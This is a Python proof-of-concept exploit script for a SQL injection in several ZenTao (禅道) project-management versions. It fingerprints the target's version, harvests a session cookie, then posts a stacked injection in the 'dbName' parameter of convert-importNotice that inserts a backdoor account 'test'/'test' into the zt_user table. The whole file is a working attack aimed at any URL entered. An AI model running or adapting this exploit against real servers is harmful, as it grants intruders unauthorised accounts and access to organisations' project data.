'''
Function:
    v17.4<= 禅道 <= v18.0.beta1（开源版）
    v3.4 <= 禅道 <= v4.0.beta1（旗舰版）
    v7.4 <= 禅道 <= v8.0.beta1（企业版）
    SQL注入POC
Author:
    spmonkey
'''
# -*- coding: utf-8 -*-
import sys
import requests
import hashlib
from requests.packages.urllib3 import disable_warnings
disable_warnings()


class exp(object):

    def __init__(self, url):
        self.url = url
        self.headers = {"Referer": self.url}
        self.type = ''
        self.routes = {
            "parameters": ['/index.php?m=misc&f=captcha&sessionVar=user&uuid=1', '/index.php?m=convert&f=importNotice'],
            "html": ['/misc-captcha-user-1.html', '/convert-importNotice.html']
        }
        self.route()
        if self.version():
            pass
        else:
            print("当前版本号不存在sql注入漏洞！")
            sys.exit()
        if self.get_cookie():
            print("cookie获取成功！\n")
        else:
            print("cookie获取失败！\n")

    def route(self):
        res = requests.get(self.url)
        if "user-login" in res.text:
            self.type = "html"
        else:
            self.type = "parameters"

    def version(self):
        headers = {
            'User-Agent': 'Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1; .NET CLR 3.0.04506.30)'
        }
        res = requests.get(self.url + '/www/index.php?mode=getconfig', headers=headers, verify=False)
        if ("17.4" <= res.json()["version"] <= "18.0.beta1") or ('3.4' <= res.json()["version"] <= '4.0.beta1') or ('7.4' <= res.json()["version"] <= '8.0.beta1'):
            return True
        else:
            return False

    def get_cookie(self):
        try:
            res = requests.get(self.url + self.routes[self.type][0])
            self.headers['cookie'] = res.headers.get("Set-cookie")
            return True
        except:
            return False

    def sql(self):
        data = {
            "dbName": "';insert into zt_user (id, account, password) values (100000000000, 'test', '{}')#".format(hashlib.md5("test".encode()).hexdigest())
        }
        res = requests.post(self.url + "/convert-importNotice.html", headers=self.headers, data=data)
        if res.status_code == 200 and 'error' in res.text:
            print("目标存在sql注入漏洞，可使用账号：test，密码：test进行登录！")
        else:
            print("目标不存在sql注入漏洞！")


if __name__ == '__main__':
    print("""
--------------------------------------------
    v17.4<= 禅道 <= v18.0.beta1（开源版）
    v3.4 <= 禅道 <= v4.0.beta1（旗舰版）
    v7.4 <= 禅道 <= v8.0.beta1（企业版）
--------------------------------------------
    """.strip())
    url = input("url:")
    a = exp(url)
    a.sql()
